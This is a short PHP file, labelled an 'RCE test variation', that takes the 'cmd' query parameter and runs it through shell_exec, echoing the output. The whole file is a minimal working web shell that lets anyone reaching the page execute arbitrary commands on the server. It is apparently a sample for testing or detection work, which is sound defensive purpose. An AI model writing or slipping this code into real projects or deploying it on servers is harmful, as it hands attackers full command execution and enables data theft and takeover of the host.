<?php
// RCE test variation #1041
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>